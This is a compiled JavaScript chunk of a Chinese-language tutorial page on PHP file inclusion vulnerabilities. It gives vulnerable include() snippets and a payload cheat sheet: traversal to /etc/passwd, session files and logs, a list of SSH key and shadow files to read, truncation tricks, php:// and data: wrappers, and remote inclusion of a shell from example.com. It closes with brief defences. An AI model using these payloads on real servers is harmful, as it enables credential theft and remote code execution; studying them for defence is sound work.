(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{527:function(t,s,a){"use strict";a.r(s);var e=a(4),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("前言")]),t._v(" "),a("p",[t._v("PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入")])]),t._v(" "),a("h2",{attrs:{id:"常见文件包含函数"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见文件包含函数"}},[t._v("#")]),t._v(" 常见文件包含函数")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("include()")]),t._v(": 执行到 include 时才包含文件, 找不到被包含文件时只会产生警告, 脚本将继续执行")]),t._v(" "),a("li",[a("strong",[t._v("require()")]),t._v(": 只要程序一运行就包含文件, 找不到被包含的文件时会产生致命错误, 并停止脚本")]),t._v(" "),a("li",[a("strong",[t._v("include_once()"),a("strong",[t._v("和")]),t._v("require_once()")]),t._v(": 若文件中代码已被包含则不会再次包含")])]),t._v(" "),a("h2",{attrs:{id:"利用条件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用条件"}},[t._v("#")]),t._v(" 利用条件")]),t._v(" "),a("p",[t._v("程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量")]),t._v(" "),a("p",[t._v("注: PHP 中只要文件内容符合 PHP 语法规范, 包含时不管扩展名是什么都会被 PHP 解析, 若文件内容不符合 PHP 语法规范则会暴漏其源码。")]),t._v(" "),a("h2",{attrs:{id:"漏洞危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞危害"}},[t._v("#")]),t._v(" 漏洞危害")]),t._v(" "),a("ul",[a("li",[t._v("执行任意代码")]),t._v(" "),a("li",[t._v("包含恶意文件控制网站")]),t._v(" "),a("li",[t._v("甚至控制服务器")])]),t._v(" "),a("h2",{attrs:{id:"漏洞分类"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞分类"}},[t._v("#")]),t._v(" 漏洞分类")]),t._v(" "),a("ul",[a("li",[t._v("本地文件包含: 可以包含本地文件, 在条件允许时甚至能执行代码")])]),t._v(" "),a("p",[t._v("-- 上传图片马, 然后包含\n-- 读敏感文件, 读 PHP 文件\n-- 包含日志文件 GetShell\n-- 包含 /proc/self/envion 文件 GetShell\n-- 包含 data: 或 php://input 等伪协议\n-- 若有 phpinfo 则可以包含临时文件")]),t._v(" "),a("ul",[a("li",[t._v("远程文件包含: 可以直接执行任意代码")])]),t._v(" "),a("p",[t._v("-- 要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On")]),t._v(" "),a("h2",{attrs:{id:"普通本地文件包含"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#普通本地文件包含"}},[t._v("#")]),t._v(" 普通本地文件包含")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"inc/"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'file'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"攻击方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式"}},[t._v("#")]),t._v(" 攻击方式")]),t._v(" "),a("h4",{attrs:{id:"包含同目录下的文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#包含同目录下的文件"}},[t._v("#")]),t._v(" 包含同目录下的文件")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=.htaccess")])]),t._v(" "),a("h4",{attrs:{id:"目录遍历"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#目录遍历"}},[t._v("#")]),t._v(" 目录遍历")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../var/lib/locate.db"),a("br"),t._v("\n?file=../../../../../../../../../var/lib/mlocate/mlocate.db"),a("br"),t._v("\n(linux 中这两个文件储存着所有文件的路径, 需要 root 权限)")])]),t._v(" "),a("h4",{attrs:{id:"包含错误日志"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#包含错误日志"}},[t._v("#")]),t._v(" 包含错误日志")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../var/log/apache/error.log")])]),t._v(" "),a("h4",{attrs:{id:"获取-web-目录或者其他配置文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取-web-目录或者其他配置文件"}},[t._v("#")]),t._v(" 获取 web 目录或者其他配置文件")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf")])]),t._v(" "),a("h4",{attrs:{id:"包含上传的附件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#包含上传的附件"}},[t._v("#")]),t._v(" 包含上传的附件")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../attachment/media/xxx.file")])]),t._v(" "),a("h4",{attrs:{id:"读取-session-文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#读取-session-文件"}},[t._v("#")]),t._v(" 读取 session 文件")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7"),a("br"),t._v("\n(session 文件一般在 /tmp 目录下, 格式为 "),a("code",[t._v("sess\\_[your phpsessid value]")]),t._v(" , 有时候也有可能在/var/lib/php5 之类的, 在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值, 也许你能够获得一个 shell)")])]),t._v(" "),a("h4",{attrs:{id:"系统中重要文件-需要-root-权限"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#系统中重要文件-需要-root-权限"}},[t._v("#")]),t._v(" 系统中重要文件(需要 root 权限)")]),t._v(" "),a("ul",[a("li",[a("code",[t._v("/root/.ssh/authorized_keys")])]),t._v(" "),a("li",[a("code",[t._v("/root/.ssh/id_rsa")])]),t._v(" "),a("li",[a("code",[t._v("/root/.ssh/id_rsa.keystore")])]),t._v(" "),a("li",[a("code",[t._v("/root/.ssh/id_rsa.pub")])]),t._v(" "),a("li",[a("code",[t._v("/root/.ssh/known_hosts")])]),t._v(" "),a("li",[a("code",[t._v("/etc/shadow")])]),t._v(" "),a("li",[a("code",[t._v("/root/.bash_history")])]),t._v(" "),a("li",[a("code",[t._v("/root/.mysql_history")])]),t._v(" "),a("li",[a("code",[t._v("/proc/self/fd/fd[0-9]* (文件标识符)")])]),t._v(" "),a("li",[a("code",[t._v("/proc/mounts")])]),t._v(" "),a("li",[a("code",[t._v("/proc/config.gz")])])]),t._v(" "),a("h2",{attrs:{id:"有限制的本地文件包含"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#有限制的本地文件包含"}},[t._v("#")]),t._v(" 有限制的本地文件包含")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"inc/"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'file'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('".htm"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"攻击方式-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式-2"}},[t._v("#")]),t._v(" 攻击方式")]),t._v(" "),a("h4",{attrs:{id:"_00-截断"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_00-截断"}},[t._v("#")]),t._v(" %00 截断")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../etc/passwd%00"),a("br"),t._v("\n(需要 magic_quotes_gpc=off, PHP 小于 5.3.4 有效)")])]),t._v(" "),a("h4",{attrs:{id:"_00-截断目录遍历"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_00-截断目录遍历"}},[t._v("#")]),t._v(" %00 截断目录遍历")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../var/www/%00"),a("br"),t._v("\n(需要 magic_quotes_gpc=off, unix 文件系统, 比如 FreeBSD, OpenBSD, NetBSD, Solaris)")])]),t._v(" "),a("h4",{attrs:{id:"路径长度截断"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#路径长度截断"}},[t._v("#")]),t._v(" 路径长度截断:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../etc/passwd/././././././.[...]/./././././."),a("br"),t._v("\n(php 版本小于 5.2.8(?)可以成功, linux 需要文件名长于 4096, windows 需要长于 256)")])]),t._v(" "),a("h4",{attrs:{id:"点号截断"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#点号截断"}},[t._v("#")]),t._v(" 点号截断:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=../../../../../../../../../boot.ini/.........[...]............"),a("br"),t._v("\n(php 版本小于 5.2.8(?)可以成功, 只适用 windows, 点号需要长于 256)")])]),t._v(" "),a("h2",{attrs:{id:"普通远程文件包含"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#普通远程文件包含"}},[t._v("#")]),t._v(" 普通远程文件包含")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'file'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"攻击方式-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式-3"}},[t._v("#")]),t._v(" 攻击方式")]),t._v(" "),a("h4",{attrs:{id:"远程代码执行"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#远程代码执行"}},[t._v("#")]),t._v(" 远程代码执行:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=[http|https|ftp]😕/example.com/shell.txt"),a("br"),t._v("\n(需要 allow_url_fopen=On 并且 allow_url_include=On)")])]),t._v(" "),a("h4",{attrs:{id:"利用-php-流-input"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用-php-流-input"}},[t._v("#")]),t._v(" 利用 php 流 input:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=php://input"),a("br"),t._v("\n(需要 allow_url_include=On)")])]),t._v(" "),a("h4",{attrs:{id:"利用-php-流-filter"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用-php-流-filter"}},[t._v("#")]),t._v(" 利用 php 流 filter:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=php://filter/convert.base64-encode/resource=index.php"),a("br"),t._v("\n(需要 allow_url_include=On)")])]),t._v(" "),a("h4",{attrs:{id:"利用-data-uris"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用-data-uris"}},[t._v("#")]),t._v(" 利用 data URIs:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file=data://text/plain; base64, SSBsb3ZlIFBIUAo="),a("br"),t._v("\n(需要 allow_url_include=On)")])]),t._v(" "),a("h4",{attrs:{id:"利用-xss-执行任意代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用-xss-执行任意代码"}},[t._v("#")]),t._v(" 利用 XSS 执行任意代码:")]),t._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file="),a("a",{attrs:{href:"http://127.0.0.1/path/xss.php?xss=phpcode",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://127.0.0.1/path/xss.php?xss=phpcode"),a("OutboundLink")],1),a("br"),t._v("\n(需要 allow_url_fopen=On, allow_url_include=On 并且防火墙或者白名单不允许访问外网时, 先在同站点找一个 XSS 漏洞, 包含这个页面, 就可以注入恶意代码了。条件非常极端和特殊- -)")])]),t._v(" "),a("h2",{attrs:{id:"有限制的远程文件包含"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#有限制的远程文件包含"}},[t._v("#")]),t._v(" 有限制的远程文件包含")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'file'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('".htm"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[t._v("攻击方式")]),t._v(" "),a("p",[t._v("?file="),a("a",{attrs:{href:"http://example.com/shell",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://example.com/shell"),a("OutboundLink")],1),a("br"),t._v("\n?file="),a("a",{attrs:{href:"http://example.com/shell.txt?",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://example.com/shell.txt?"),a("OutboundLink")],1),a("br"),t._v("\n?file="),a("a",{attrs:{href:"http://example.com/shell.txt%23",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://example.com/shell.txt%23"),a("OutboundLink")],1),a("br"),t._v("\n(需要 allow_url_fopen=On 并且 allow_url_include=On)"),a("br"),t._v("\n?file=\\evilshare\\shell.php (只需要 allow_url_include=On)")])]),t._v(" "),a("h2",{attrs:{id:"延伸"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#延伸"}},[t._v("#")]),t._v(" 延伸")]),t._v(" "),a("p",[t._v("其实在前面也说了, 这些漏洞产生原因是 PHP 函数在引入文件时, 传入的文件名没有经过合理的校验, 从而操作了预想之外的文件。实际上我们操作文件的函数不只是 include()一个, 上面提到的一些截断的方法同样可以适用于以下函数:")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("fopen")])]),t._v(" "),a("li",[a("strong",[t._v("file_get_contents")])]),t._v(" "),a("li",[a("strong",[t._v("copy")])]),t._v(" "),a("li",[a("strong",[t._v("parse_ini_file")])]),t._v(" "),a("li",[a("strong",[t._v("readfile")])]),t._v(" "),a("li",[a("strong",[t._v("file_put_contents")])]),t._v(" "),a("li",[a("strong",[t._v("mkdir")])]),t._v(" "),a("li",[a("strong",[t._v("tempnam")])]),t._v(" "),a("li",[a("strong",[t._v("move_uploaded_file")])]),t._v(" "),a("li",[a("strong",[t._v("rename")])]),t._v(" "),a("li",[a("strong",[t._v("unlink")])]),t._v(" "),a("li",[a("strong",[t._v("rmdir")])]),t._v(" "),a("li",[a("strong",[t._v("require")])]),t._v(" "),a("li",[a("strong",[t._v("require_once")])]),t._v(" "),a("li",[a("strong",[t._v("include_once")])]),t._v(" "),a("li",[a("strong",[t._v("ZipArchive::open()")])])]),t._v(" "),a("h2",{attrs:{id:"漏洞防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞防御"}},[t._v("#")]),t._v(" 漏洞防御")]),t._v(" "),a("ul",[a("li",[t._v("PHP 中使用 open_basedir 配置, 将访问限制在指定区域")]),t._v(" "),a("li",[t._v("过滤 "),a("code",[t._v("./\\")])]),t._v(" "),a("li",[t._v("禁止服务器远程文件包含")])])])}),[],!1,null,null,null);s.default=r.exports}}]);